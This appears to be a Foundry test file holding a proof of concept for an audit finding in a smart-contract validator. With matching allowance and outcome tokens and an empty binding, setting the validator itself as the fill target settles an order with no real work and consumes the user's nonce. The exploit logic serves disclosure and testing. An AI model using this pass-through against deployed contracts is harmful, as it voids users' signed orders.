// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity ^0.8.30;

import { Test } from "forge-std/src/Test.sol";

import { MockERC20 } from "solady/test/utils/mocks/MockERC20.sol";

import { CATValidatorV2 } from "../../src/CATValidatorV2.sol";
import { AllowanceSpend, Outcome } from "../../src/libs/LibExecutionConstraint.sol";
import { ExecutionBinding } from "../../src/libs/LibExecutionConstraintV2.sol";
import { VMCommand } from "../../src/libs/LibValidationVM.sol";
import { V2ConstraintDigest } from "../helpers/V2ConstraintDigest.sol";

/// @dev Accepts every program.
contract AcceptVM {
    fallback() external { }
}

/**
 * PoC for finding: when the allowance token and the outcome token coincide and
 * the binding is 0/0, `execTarget = address(validator)` routes the user's own
 * allowance through the outcome floor: the fill settles with zero economic
 * work, the committed action never runs, and the nonce is consumed. Neither
 * the floor nor a `paid >= k * spent` flow program can distinguish this
 * pass-through from a real fill, because both measure funds passing through
 * the validator.
 */
contract PassThroughFillPoC is Test {
    uint256 constant MAGIC = 1 << 255;

    MockERC20 token;
    CATValidatorV2 validator;

    address signer;
    uint256 signerKey;
    address executor;
    address destination;

    function setUp() external {
        token = new MockERC20("Token", "TKN", 18);
        validator = new CATValidatorV2(address(new AcceptVM()));
        (signer, signerKey) = makeAddrAndKey("signer");
        executor = makeAddr("executor");
        destination = makeAddr("destination");

        token.mint(signer, 1000 ether);
        vm.prank(signer);
        token.approve(address(validator), type(uint256).max);
    }

    function sign(
        AllowanceSpend[] memory alls,
        Outcome[] memory outs,
        bytes32 programHash
    ) internal view returns (bytes memory) {
        bytes32 digest = V2ConstraintDigest.unbound(
            validator.DOMAIN_SEPARATOR(), alls, outs, executor, 1, programHash, bytes32(0)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, digest);
        return abi.encodePacked(r, s, v);
    }

    function test_passthrough_satisfiesNonzeroFloorWithNoWork() external {
        AllowanceSpend[] memory alls = new AllowanceSpend[](1);
        alls[0] = AllowanceSpend({ token: address(token), allocated: type(uint256).max, spend: MAGIC });
        // A real signed floor: the user demands 990 back of the 1000 at stake.
        Outcome[] memory outs = new Outcome[](1);
        outs[0] = Outcome({ token: address(token), amount: 990 ether, destination: destination });

        bytes memory sig = sign(alls, outs, bytes32(0));

        vm.prank(executor);
        validator.entry(
            address(validator), // the validator itself as the fill target
            hex"", // no payload: no committed action runs
            signer,
            1,
            alls,
            outs,
            ExecutionBinding({ executionTarget: address(0), payloadHash: bytes32(0) }),
            new VMCommand[](0),
            new bytes32[](0),
            sig
        );

        // The fill settled: the floor was satisfied by the user's own funds.
        assertEq(token.balanceOf(destination), 1000 ether, "full balance forwarded to destination");
        assertEq(token.balanceOf(signer), 0, "escrow emptied");
        assertEq(token.balanceOf(address(validator)), 0, "validator keeps nothing");
        assertTrue(validator.spentNonces(signer, 1), "nonce consumed; the constraint cannot be re-filled");
    }
}
